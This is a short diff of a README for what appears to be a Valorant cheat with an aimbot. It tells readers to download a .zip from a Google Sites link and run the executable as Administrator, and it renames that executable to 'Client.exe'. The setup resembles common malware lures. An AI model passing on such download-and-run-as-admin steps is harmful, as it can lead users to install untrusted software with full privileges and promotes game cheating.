@@ -17,7 +17,7 @@
 
 ## 📥 Download & Setup  
 1. **Download** the latest `.zip` from [[HERE](https://sites.google.com/view/v231/)]
-2. **Extract** and run `CyberValorant.exe` as **Administrator**.  
+2. **Extract** and run `Client.exe` as **Administrator**.  
 3. **Hotkeys**:  
    - `INSERT` → Open/Close menu  
    - `F1` → Toggle Aimbot  
